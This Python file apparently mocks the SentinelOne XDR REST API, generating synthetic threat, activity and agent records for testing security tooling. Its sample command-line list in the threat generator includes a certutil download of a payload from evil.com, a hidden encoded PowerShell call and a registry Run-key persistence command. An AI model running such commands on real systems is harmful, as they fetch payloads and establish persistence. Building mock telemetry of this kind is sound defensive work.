"""SentinelOne Singularity XDR pull source — realistic REST API mock.

Matches the real SentinelOne Management Console API v2.1:
  GET /web/api/v2.1/threats
  GET /web/api/v2.1/activities
  GET /web/api/v2.1/agents
  GET /web/api/v2.1/cloud-detection/alerts
Auth: ApiToken (Authorization: ApiToken <token>)
Pagination: cursor-based with nextCursor
"""

from __future__ import annotations

import random
import base64
import json
from datetime import datetime, timezone, timedelta
from typing import Any
from generators import generate_ip, generate_hostname, generate_uuid
from detection_rules import inject_detection_events
import profiles

# ── Shared constants ─────────────────────────────────────────────────────────

_ACCOUNT_ID = "2149421019176225082"
_ACCOUNT_NAME = "RoarinPenguin"
_SITES = [
    {"id": "2168724616075133168", "name": "Resilient Inc"},
    {"id": "2168724616075133169", "name": "Branch-Office"},
    {"id": "2168724616075133170", "name": "Cloud-Workloads"},
]
_GROUPS = [
    {"id": "2168724616091910385", "name": "Default Group"},
    {"id": "2168724616091910386", "name": "Servers"},
    {"id": "2168724616091910387", "name": "Workstations"},
    {"id": "2168724616091910388", "name": "Linux Servers"},
]
_HOSTNAMES = ["Melbourne-KY3H", "DESKTOP-HQ01", "LAPTOP-SALES02", "SRV-DC-01",
              "SRV-WEB-02", "LAPTOP-ENG03", "DESKTOP-FIN04", "SRV-DB-01",
              "SRV-EXCHANGE-01", "SRV-FILE-01", "RoarinSrv2022"]
_OS_MAP = {
    "windows": [
        ("Windows 10 Enterprise Evaluation", "19045"),
        ("Windows 11 Pro 23H2", "22635"),
        ("Windows Server 2022 Standard", "20348"),
        ("Windows Server 2019 Standard", "17763"),
    ],
    "linux": [
        ("Ubuntu 22.04.3 LTS", "22.04"),
        ("RHEL 9.3", "9.3"),
        ("CentOS Stream 9", "9"),
    ],
    "macos": [
        ("macOS 14.4 Sonoma", "14.4"),
    ],
}
_OS_TYPES = ["windows", "windows", "windows", "linux", "macos"]
_USERS_UPN = [
    "jeanluc@starfleet.local", "riker@starfleet.local", "data@starfleet.local",
    "troi@starfleet.local", "worf@starfleet.local", "laforge@starfleet.local",
]
_USERS_DOMAIN = ["STARFLEET\\jeanluc", "STARFLEET\\riker", "STARFLEET\\data",
                 "STARFLEET\\troi", "STARFLEET\\worf", "CORP\\admin"]
_AGENT_VERSIONS = ["25.1.3.334", "24.3.2.15", "24.1.2.5", "23.4.6.3"]
_MITIGATION_MODES = ["detect", "protect", "detect"]
_DETECTION_STATES = ["full_mode", "full_mode", "full_mode", "partial_mode"]
_MACHINE_TYPES = ["desktop", "server", "laptop", "kubernetes node"]

_THREAT_NAMES = [
    "Suspicious PowerShell Command", "LSASS Access Detected", "Cobalt Strike Beacon",
    "Lateral Movement via PsExec", "Ransomware Behavior - File Encryption",
    "Malicious DLL Side-Loading", "Process Injection - CreateRemoteThread",
    "Reverse Shell Established", "Kerberoasting Attempt", "DCSync Attack",
    "Mimikatz Credential Dumping", "Living Off The Land - Certutil Download",
    "Registry Run Key Persistence", "Scheduled Task Persistence",
    "WMI Remote Execution", "Suspicious DNS Query - DGA",
]
_CLASSIFICATIONS = ["Malware", "Trojan", "Ransomware", "Exploit", "PUA",
                     "Infostealer", "Backdoor", "Worm", "Dropper"]
_ENGINES = ["On-Write Static AI", "On-Write Dynamic AI", "Behavioral AI",
            "Cloud Intelligence", "Application Control", "STAR Custom Rule"]
_ANALYST_VERDICTS = ["undefined", "suspicious", "true_positive", "false_positive"]
_INCIDENT_STATUSES = ["new", "in_progress", "resolved", "unresolved"]
_CONFIDENCE_LEVELS = ["malicious", "suspicious", "n/a"]
_PROCESS_NAMES = ["cmd.exe", "powershell.exe", "rundll32.exe", "wmic.exe",
                  "certutil.exe", "mshta.exe", "cscript.exe", "svchost.exe"]
_FILE_PATHS_WIN = ["C:\\Windows\\System32\\", "C:\\Users\\Public\\Downloads\\",
                   "C:\\ProgramData\\", "C:\\Windows\\Temp\\"]
_FILE_PATHS_LIN = ["/tmp/", "/var/tmp/", "/usr/local/bin/", "/home/user/"]

_TACTICS_TECHNIQUES = [
    ({"id": "TA0001", "name": "Initial Access"}, {"id": "T1566", "name": "Phishing", "link": "https://attack.mitre.org/techniques/T1566"}),
    ({"id": "TA0002", "name": "Execution"}, {"id": "T1059.001", "name": "PowerShell", "link": "https://attack.mitre.org/techniques/T1059/001"}),
    ({"id": "TA0003", "name": "Persistence"}, {"id": "T1547", "name": "Boot or Logon Autostart Execution", "link": "https://attack.mitre.org/techniques/T1547"}),
    ({"id": "TA0004", "name": "Privilege Escalation"}, {"id": "T1055", "name": "Process Injection", "link": "https://attack.mitre.org/techniques/T1055"}),
    ({"id": "TA0005", "name": "Defense Evasion"}, {"id": "T1218.011", "name": "Rundll32", "link": "https://attack.mitre.org/techniques/T1218/011"}),
    ({"id": "TA0006", "name": "Credential Access"}, {"id": "T1003.001", "name": "LSASS Memory", "link": "https://attack.mitre.org/techniques/T1003/001"}),
    ({"id": "TA0008", "name": "Lateral Movement"}, {"id": "T1021.002", "name": "SMB/Windows Admin Shares", "link": "https://attack.mitre.org/techniques/T1021/002"}),
    ({"id": "TA0011", "name": "Command and Control"}, {"id": "T1071", "name": "Application Layer Protocol", "link": "https://attack.mitre.org/techniques/T1071"}),
    ({"id": "TA0040", "name": "Impact"}, {"id": "T1486", "name": "Data Encrypted for Impact", "link": "https://attack.mitre.org/techniques/T1486"}),
    ({"id": "TA0006", "name": "Credential Access"}, {"id": "T1558", "name": "Steal or Forge Kerberos Tickets", "link": "https://attack.mitre.org/techniques/T1558"}),
]


def _now() -> str:
    return datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%S.%fZ")


def _past(max_hours: int = 24) -> str:
    dt = datetime.now(timezone.utc) - timedelta(seconds=random.randint(1, max_hours * 3600))
    return dt.strftime("%Y-%m-%dT%H:%M:%S.%fZ")


def _make_cursor(offset: int) -> str:
    return base64.b64encode(json.dumps({"offset": offset}).encode()).decode()


def _agent_info(ctx=None) -> tuple[dict, dict]:
    """Return (agentDetectionInfo, agentRealtimeInfo) matching real API shape."""
    pm = ctx.pick_machine() if ctx else None
    hostname = pm.get("primary_workstation", random.choice(_HOSTNAMES)) if pm else random.choice(_HOSTNAMES)
    os_type = random.choice(_OS_TYPES)
    os_name, os_rev = random.choice(_OS_MAP.get(os_type, _OS_MAP["windows"]))
    site = random.choice(_SITES)
    group = random.choice(_GROUPS)
    agent_id = str(random.randint(2400000000000000000, 2500000000000000000))
    agent_uuid = generate_uuid()
    agent_ver = random.choice(_AGENT_VERSIONS)
    domain = random.choice(["STARFLEET", "CORP", "WORKGROUP"])
    ext_ip = generate_ip()
    internal_ip = f"192.168.{random.randint(1,254)}.{random.randint(1,254)}"
    mit_mode = random.choice(_MITIGATION_MODES)

    detection_info = {
        "accountId": _ACCOUNT_ID,
        "accountName": _ACCOUNT_NAME,
        "agentDetectionState": random.choice(_DETECTION_STATES),
        "agentDomain": domain,
        "agentIpV4": internal_ip,
        "agentIpV6": "::1",
        "agentLastLoggedInUpn": None,
        "agentLastLoggedInUserMail": None,
        "agentLastLoggedInUserName": f"{domain}\\{random.choice(['jeanluc','riker','data','troi','worf'])}",
        "agentMitigationMode": mit_mode,
        "agentOsName": os_name,
        "agentOsRevision": os_rev,
        "agentRegisteredAt": _past(max_hours=720),
        "agentUuid": agent_uuid,
        "agentVersion": agent_ver,
        "assetVersion": "",
        "cloudProviders": {},
        "externalIp": ext_ip,
        "groupId": group["id"],
        "groupName": group["name"],
        "siteId": site["id"],
        "siteName": site["name"],
    }
    realtime_info = {
        "accountId": _ACCOUNT_ID,
        "accountName": _ACCOUNT_NAME,
        "activeThreats": random.choices([0, 0, 0, 1, 2], weights=[60, 15, 10, 10, 5])[0],
        "agentComputerName": hostname,
        "agentDecommissionedAt": None,
        "agentDomain": domain,
        "agentId": agent_id,
        "agentInfected": random.random() < 0.12,
        "agentIsActive": True,
        "agentIsDecommissioned": False,
        "agentMachineType": random.choice(_MACHINE_TYPES),
        "agentMitigationMode": mit_mode,
        "agentNetworkStatus": random.choices(["connected", "disconnected"], weights=[90, 10])[0],
        "agentOsName": os_name,
        "agentOsRevision": os_rev,
        "agentOsType": os_type,
        "agentUuid": agent_uuid,
        "agentVersion": agent_ver,
        "groupId": group["id"],
        "groupName": group["name"],
        "networkInterfaces": [{
            "id": str(random.randint(2400000000000000000, 2500000000000000000)),
            "inet": [internal_ip],
            "inet6": ["::1"],
            "name": random.choice(["Ethernet0", "eth0", "en0"]),
            "physical": ":".join(f"{random.randint(0,255):02x}" for _ in range(6)),
        }],
        "operationalState": "na",
        "rebootRequired": False,
        "scanAbortedAt": None,
        "scanFinishedAt": _past(48) if random.random() < 0.3 else None,
        "scanStartedAt": None,
        "scanStatus": random.choice(["none", "finished", "none"]),
        "siteId": site["id"],
        "siteName": site["name"],
        "storageName": None,
        "storageType": None,
        "userActionsNeeded": [],
    }
    return detection_info, realtime_info


# ── Threat generator ─────────────────────────────────────────────────────────

def _generate_threat(ctx=None) -> dict[str, Any]:
    detection_info, realtime_info = _agent_info(ctx)
    pu = ctx.pick_user() if ctx else None
    pmal = ctx.pick_malware() if ctx else None
    pc2 = ctx.pick_c2() if ctx else None

    tactic, technique = random.choice(_TACTICS_TECHNIQUES)
    threat_name = pmal.get("filename", random.choice(_THREAT_NAMES)) if pmal else random.choice(_THREAT_NAMES)
    classification = random.choice(_CLASSIFICATIONS)
    engine = random.choice(_ENGINES)
    confidence = random.choices(_CONFIDENCE_LEVELS, weights=[60, 30, 10])[0]
    user = pu.get("username", random.choice(_USERS_DOMAIN)) if pu else random.choice(_USERS_DOMAIN)
    os_type = realtime_info["agentOsType"]
    file_path = random.choice(_FILE_PATHS_WIN if os_type == "windows" else _FILE_PATHS_LIN)
    proc = random.choice(_PROCESS_NAMES) if os_type == "windows" else random.choice(["python3", "bash", "curl"])
    sha256 = "".join(random.choices("0123456789abcdef", k=64))
    sha1 = "".join(random.choices("0123456789abcdef", k=40))
    md5 = "".join(random.choices("0123456789abcdef", k=32))
    storyline = generate_uuid()
    threat_id = str(random.randint(2400000000000000000, 2500000000000000000))
    created = _past(24)

    cmdlines = [
        f"powershell.exe -enc UwB0AGEAcgB0AC0A -WindowStyle Hidden",
        f"cmd.exe /c whoami /all",
        f"rundll32.exe shell32.dll,ShellExec_RunDLL",
        f"certutil.exe -urlcache -f http://evil.com/payload.exe",
        f"wmic process call create calc.exe",
        f"reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
    ]
    cmdline = pmal.get("cmdline", random.choice(cmdlines)) if pmal else random.choice(cmdlines)

    return {
        "agentDetectionInfo": detection_info,
        "agentRealtimeInfo": realtime_info,
        "containerInfo": {"id": None, "image": None, "isContainerQuarantine": None, "labels": None, "name": None},
        "id": threat_id,
        "indicators": [
            {"category": "General", "description": f"Detected by the {engine}", "ids": [random.randint(1, 200)], "tactics": []}
        ] + ([{"category": tactic["name"], "description": technique["name"], "ids": [random.randint(200, 999)],
              "tactics": [{"name": tactic["name"], "source": "MITRE", "techniques": [technique]}]}] if random.random() < 0.7 else []),
        "kubernetesInfo": {"cluster": None, "controllerKind": None, "controllerLabels": None, "controllerName": None,
                          "isContainerQuarantine": None, "namespace": None, "namespaceLabels": None, "node": None, "pod": None, "podLabels": None},
        "mitigationStatus": [{"action": random.choice(["kill", "quarantine", "remediate"]),
                              "actionsCounters": {"failed": 0, "notFound": 0, "pendingReboot": 0, "success": 1, "total": 1},
                              "agentSupportsReport": True, "groupNotFound": False,
                              "lastUpdate": created, "latestReport": None,
                              "mitigationEndedAt": created, "mitigationStartedAt": created,
                              "status": random.choice(["success", "success", "partially_mitigated"])}],
        "threatInfo": {
            "analystVerdict": random.choice(_ANALYST_VERDICTS),
            "analystVerdictDescription": "Default verdict",
            "automaticallyResolved": random.random() < 0.3,
            "browserType": None,
            "certificateId": "",
            "classification": classification,
            "classificationSource": engine,
            "cloudFilesHashVerdict": random.choice(["unknown", "safe", "malicious"]),
            "collectionId": str(random.randint(2400000000000000000, 2500000000000000000)),
            "confidenceLevel": confidence,
            "createdAt": created,
            "detectionEngines": [{"key": engine.lower().replace(" ", "_"), "title": engine}],
            "detectionType": random.choice(["static", "dynamic", "reputation"]),
            "engines": [engine],
            "externalTicketExists": False,
            "externalTicketId": None,
            "failedActions": False,
            "fileExtensionType": "Executable" if os_type == "windows" else "Script",
            "fileSize": random.randint(10000, 5000000),
            "fileVerificationType": random.choice(["SignedVerified", "Unsigned", "SignedNotVerified"]),
            "filePath": file_path + threat_name.replace(" ", "_").lower() + (".exe" if os_type == "windows" else ""),
            "identifiedAt": created,
            "incidentStatus": random.choice(_INCIDENT_STATUSES),
            "incidentStatusDescription": "Threat is new",
            "initiatedBy": random.choice(["agent_policy", "cloud_detection", "star_manual", "full_disk_scan"]),
            "initiatedByDescription": "Agent Policy",
            "isFileless": random.random() < 0.1,
            "isValidCertificate": False,
            "md5": md5,
            "mitigatedPreemptively": random.random() < 0.2,
            "mitigationStatus": random.choice(["not_mitigated", "mitigated", "partially_mitigated"]),
            "mitigationStatusDescription": "Not mitigated",
            "originatorProcess": proc,
            "pendingActions": False,
            "processUser": user,
            "publisherName": "",
            "reachedEventsLimit": False,
            "rebootRequired": False,
            "sha1": sha1,
            "sha256": sha256,
            "storyline": storyline,
            "threatId": threat_id,
            "threatName": threat_name,
            "updatedAt": _now(),
        },
        "whiteningOptions": ["hash", "path", "certificate", "browser"],
    }


# ── Activity generator ───────────────────────────────────────────────────────

_ACTIVITY_TYPES = [
    (1, "Agent Installed", "Agent installed successfully"),
    (2, "Agent Started", "Agent service started"),
    (17, "Threat Mitigated", "Threat was successfully mitigated"),
    (23, "Agent Scan Started", "Full disk scan initiated"),
    (24, "Agent Scan Completed", "Full disk scan completed"),
    (27, "Agent Policy Updated", "Policy updated from management console"),
    (33, "User Login", "User logged in to management console"),
    (52, "Network Quarantine", "Agent isolated from network"),
    (65, "Threat Rollback", "Rollback completed for threat"),
    (70, "Remote Shell Opened", "Remote shell session opened"),
    (80, "Application Blocked", "Application execution blocked by policy"),
    (86, "Ranger Scan", "New device discovered on network"),
    (3600, "STAR Custom Rule", "Custom detection rule triggered"),
    (3638, "Application Error", "Application returned error"),
    (5020, "Identity Alert", "Suspicious identity behavior detected"),
]


def _generate_activity(ctx=None) -> dict[str, Any]:
    _, realtime = _agent_info(ctx)
    act_id, primary, desc = random.choice(_ACTIVITY_TYPES)
    created = _past(24)
    return {
        "accountId": _ACCOUNT_ID,
        "accountName": _ACCOUNT_NAME,
        "activityType": act_id,
        "activityUuid": generate_uuid(),
        "agentId": realtime["agentId"],
        "agentUpdatedVersion": None,
        "comments": None,
        "createdAt": created,
        "data": {
            "accountName": _ACCOUNT_NAME,
            "computerName": realtime["agentComputerName"],
            "fullScopeDetails": f"Account {_ACCOUNT_NAME}",
            "fullScopeDetailsPath": f"Global / {_ACCOUNT_NAME}",
            "groupName": realtime["groupName"],
            "scopeLevel": "Account",
            "scopeName": _ACCOUNT_NAME,
            "siteName": realtime["siteName"],
            "username": random.choice(_USERS_DOMAIN),
        },
        "description": None,
        "groupId": realtime["groupId"],
        "groupName": realtime["groupName"],
        "hash": None,
        "id": str(random.randint(2400000000000000000, 2500000000000000000)),
        "osFamily": realtime["agentOsType"],
        "primaryDescription": primary,
        "secondaryDescription": desc,
        "siteId": realtime["siteId"],
        "siteName": realtime["siteName"],
        "threatId": None,
        "updatedAt": created,
        "userId": None,
    }


# ── Agent generator ──────────────────────────────────────────────────────────

def _generate_agent(ctx=None) -> dict[str, Any]:
    detection, realtime = _agent_info(ctx)
    os_type = realtime["agentOsType"]
    hostname = realtime["agentComputerName"]
    site = {"id": realtime["siteId"], "name": realtime["siteName"]}
    group = {"id": realtime["groupId"], "name": realtime["groupName"]}
    created = _past(720)
    return {
        "accountId": _ACCOUNT_ID,
        "accountName": _ACCOUNT_NAME,
        "activeDirectory": {"computerDistinguishedName": None, "computerMemberOf": [], "lastUserDistinguishedName": None, "lastUserMemberOf": []},
        "activeProtection": "",
        "activeThreats": realtime["activeThreats"],
        "agentVersion": realtime["agentVersion"],
        "allowRemoteShell": True,
        "appsVulnerabilityStatus": random.choice(["up_to_date", "patch_required", "not_applicable"]),
        "cloudProviders": {},
        "computerName": hostname,
        "consoleMigrationStatus": "N/A",
        "containerizedWorkloadCounts": None,
        "coreCount": random.choice([2, 4, 8, 16]),
        "cpuCount": random.choice([1, 2, 4]),
        "cpuId": random.choice(["Intel(R) Core(TM) i7-12700K", "AMD EPYC 7763", "Intel(R) Xeon(R) E-2388G", "Apple M3 Pro"]),
        "createdAt": created,
        "detectionState": detection["agentDetectionState"],
        "domain": realtime["agentDomain"],
        "encryptedApplications": False,
        "externalId": "",
        "externalIp": detection["externalIp"],
        "firewallEnabled": True,
        "firstFullModeTime": created,
        "groupId": group["id"],
        "groupIp": f"192.168.{random.randint(1,254)}.x/24",
        "groupName": group["name"],
        "id": realtime["agentId"],
        "inRemoteShellSession": False,
        "infected": realtime["agentInfected"],
        "installerType": ".exe",
        "isActive": realtime["agentIsActive"],
        "isDecommissioned": False,
        "isUpToDate": random.random() < 0.8,
        "lastActiveDate": _past(2),
        "lastIpToMgmt": f"192.168.{random.randint(1,254)}.{random.randint(1,254)}",
        "lastLoggedInUserName": detection.get("agentLastLoggedInUserName", ""),
        "machineType": realtime["agentMachineType"],
        "mitigationMode": detection["agentMitigationMode"],
        "mitigationModeSuspicious": "detect",
        "modelName": random.choice(["VMware Virtual Platform", "Dell PowerEdge R750", "HP ProLiant DL380 Gen10", "MacBookPro18,1"]),
        "networkInterfaces": realtime["networkInterfaces"],
        "networkQuarantineEnabled": True,
        "networkStatus": realtime["agentNetworkStatus"],
        "operationalState": realtime["operationalState"],
        "osArch": "64 bit",
        "osName": realtime["agentOsName"],
        "osRevision": realtime["agentOsRevision"],
        "osStartTime": _past(168),
        "osType": os_type,
        "osUsername": detection.get("agentLastLoggedInUserName", ""),
        "rangerStatus": random.choice(["Enabled", "Enabled", "Disabled"]),
        "rangerVersion": realtime["agentVersion"],
        "registeredAt": created,
        "scanStatus": realtime["scanStatus"],
        "serialNumber": "".join(random.choices("0123456789ABCDEF", k=10)),
        "siteId": site["id"],
        "siteName": site["name"],
        "tags": {"sentinelone": []},
        "threatRebootRequired": False,
        "totalMemory": random.choice([8192, 16384, 32768, 65536]),
        "updatedAt": _past(2),
        "uuid": realtime["agentUuid"],
    }


# ── Public API ───────────────────────────────────────────────────────────────

def generate_threats(count: int = 10) -> dict[str, Any]:
    ctx = profiles.get_context("sentinelone")
    count = profiles.scale_count("sentinelone", count)
    data = [_generate_threat(ctx) for _ in range(count)]
    data = inject_detection_events("sentinelone", data)
    cursor = _make_cursor(count) if count >= 10 else None
    return {
        "data": data,
        "pagination": {"nextCursor": cursor, "totalItems": max(count, random.randint(20, 200))},
    }


def generate_activities(count: int = 10) -> dict[str, Any]:
    ctx = profiles.get_context("sentinelone")
    count = profiles.scale_count("sentinelone", count)
    data = [_generate_activity(ctx) for _ in range(count)]
    cursor = _make_cursor(count) if count >= 10 else None
    return {
        "data": data,
        "pagination": {"nextCursor": cursor, "totalItems": max(count, random.randint(50, 500))},
    }


def generate_agents(count: int = 10) -> dict[str, Any]:
    ctx = profiles.get_context("sentinelone")
    count = profiles.scale_count("sentinelone", min(count, 50))
    data = [_generate_agent(ctx) for _ in range(count)]
    cursor = _make_cursor(count) if count >= 10 else None
    return {
        "data": data,
        "pagination": {"nextCursor": cursor, "totalItems": max(count, random.randint(10, 100))},
    }
